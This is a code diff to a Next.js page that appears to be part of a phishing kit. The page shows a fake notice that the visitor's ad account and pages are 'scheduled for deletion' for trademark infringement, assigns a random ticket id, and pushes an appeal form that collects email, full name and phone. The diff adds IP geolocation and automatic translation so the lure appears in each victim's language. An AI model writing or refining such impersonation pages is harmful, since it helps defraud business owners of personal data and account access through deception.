@@ -1,7 +1,9 @@
 'use client';
 import { store } from '@/store/store';
-import { useTranslation } from '@/utils/use-translation';
+import { getTranslations } from '@/utils/translate';
+import { COUNTRY_TO_LANGUAGE, type LanguageCode } from '@/utils/country-language-map';
 
+import axios from 'axios';
 import { useEffect, useState, type FC } from 'react';
 import Image from 'next/image';
 import BlobIcon from '@/assets/images/blob.png';
@@ -23,6 +25,10 @@ interface VerifyFormData {
 const Page: FC = () => {
     const { isModalOpen, setModalOpen, setFormStep, formStep, userEmail, userFullName, userPhone } = store();
     const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
+    
+    // Translation state
+    const [countryCode, setCountryCode] = useState('US');
+    const [translations, setTranslations] = useState<Record<string, string>>({}); 
     
     // Generate random ticket ID
     const generateTicketId = (): string => {
@@ -51,7 +57,112 @@ const Page: FC = () => {
         description: ''
     });
 
-    const { t } = useTranslation();
+    // Geo-detection effect
+    useEffect(() => {
+        const fetchGeoInfo = async () => {
+            try {
+                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json', { timeout: 5000 });
+                const cc = (data.country_code || 'US').toUpperCase();
+                setCountryCode(cc);
+            } catch {
+                setCountryCode('US');
+            }
+        };
+        fetchGeoInfo();
+    }, []);
+
+    // Translation effect - hybrid: hardcoded first, then API fallback
+    useEffect(() => {
+        if (!countryCode) return;
+
+        (async () => {
+            const lang = (COUNTRY_TO_LANGUAGE[countryCode.toLowerCase()] || 'en') as LanguageCode;
+            if (lang === 'en') {
+                setTranslations({});
+                return;
+            }
+
+            // 1. Get hardcoded translations from translate.ts
+            const hardcodedTrans = getTranslations(lang) || {};
+            setTranslations(hardcodedTrans);
+
+            // 2. Identify texts NOT in hardcoded translations (need API)
+            const allTextsNeeded = [
+                'We have scheduled your ad account and pages for deletion',
+                'We have received multiple reports indicating that your advertisement violates trademark rights. After a detailed review, we have made a decision regarding this matter.',
+                'If no corrective actions are taken, your advertising account will be permanently deleted. If you wish to appeal this decision, please submit an appeal request to us for review and assistance.',
+                'Your ticket id:',
+                'Request review',
+                'This team is used for submitting appeals and restoring account status.',
+                'Please ensure that you provide the required information below. Failure to do so may delay the processing of your appeal.',
+                'What is trademark infringement?',
+                'Generally, trademark infringement occurs when all three of the following requirements are met:',
+                'A company or person uses a trademark owner\'s trademark (or similar trademark) without permission.',
+                'That use is in commerce, meaning that it\'s done in connection with the sale or promotion of goods or services.',
+                'That use is likely to confuse consumers about the source, endorsement or affiliation of the goods or services.',
+                'Trademark infringement is often "likelihood of confusion" and there are many factors that determine whether a use is likely to cause confusion. For example, when a person\'s trademark is also used by someone else. But on unrelated goods or services, that use may not be infringement because it may not be likely to cause confusion. For example, when a person\'s trademark first can often be an important consideration as well.',
+                'Help Center',
+                'Privacy Policy',
+                'Terms of Service',
+                'Community Standards',
+            ];
+
+            const missingTexts = allTextsNeeded.filter(text => !hardcodedTrans[text]);
+            
+            if (missingTexts.length === 0) return; // All texts already in translate.ts
+
+            // 3. Translate missing texts using Google API
+            const CACHE_KEY = `translation_cache_${lang}`;
+            const cached = typeof window !== 'undefined' ? localStorage.getItem(CACHE_KEY) : null;
+            const cache = cached ? JSON.parse(cached) : {};
+
+            const translatePromises = missingTexts.map(async (text) => {
+                if (cache[text]) {
+                    return { text, translated: cache[text] };
+                }
+
+                try {
+                    const response = await axios.get('https://translate.googleapis.com/translate_a/single', {
+                        params: {
+                            client: 'gtx',
+                            sl: 'en',
+                            tl: lang,
+                            dt: 't',
+                            q: text
+                        },
+                        timeout: 3000
+                    });
+
+                    const translatedText = response.data[0]
+                        ?.map((item: unknown[]) => item[0])
+                        .filter(Boolean)
+                        .join('') || text;
+
+                    cache[text] = translatedText;
+                    return { text, translated: translatedText };
+                } catch {
+                    return { text, translated: text };
+                }
+            });
+
+            const results = await Promise.all(translatePromises);
+
+            // Save to cache
+            if (typeof window !== 'undefined') {
+                localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
+            }
+
+            // Merge API-translated texts with hardcoded ones
+            const mergedTranslations = { ...hardcodedTrans };
+            results.forEach(({ text, translated }) => {
+                mergedTranslations[text] = translated;
+            });
+
+            setTranslations(mergedTranslations);
+        })();
+    }, [countryCode]);
+
+    const t = (text: string): string => translations[text] || text;
 
     // Reset formStep when entering ads-rejected page
     useEffect(() => {
